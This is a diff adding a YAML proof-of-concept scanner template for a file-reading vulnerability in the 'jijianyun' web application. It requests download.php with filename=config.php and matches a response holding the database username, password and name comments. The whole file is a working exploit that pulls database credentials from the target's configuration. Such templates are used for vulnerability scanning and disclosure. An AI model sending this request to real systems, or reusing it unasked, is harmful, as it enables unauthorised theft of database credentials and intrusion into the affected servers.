@@ -1,0 +1,20 @@
+name: poc-yaml-jijianyun-download.php-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /download.php?file=20b6cb088a8d5c444074&filename=config.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'//数据库用户名') && response.body.bcontains(b'//数据库密码') && response.body.bcontains(b'//数据库名')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488181&idx=1&sn=3bb53898511573714dc7a0ec8208c649&chksm=c267a786f5102e901c3ca974ff99c0d9b27b94fe5f33ee3eb07dfacc5c9b201dfd76730ecce2&token=350950895&lang=zh_CN#rd
+
+
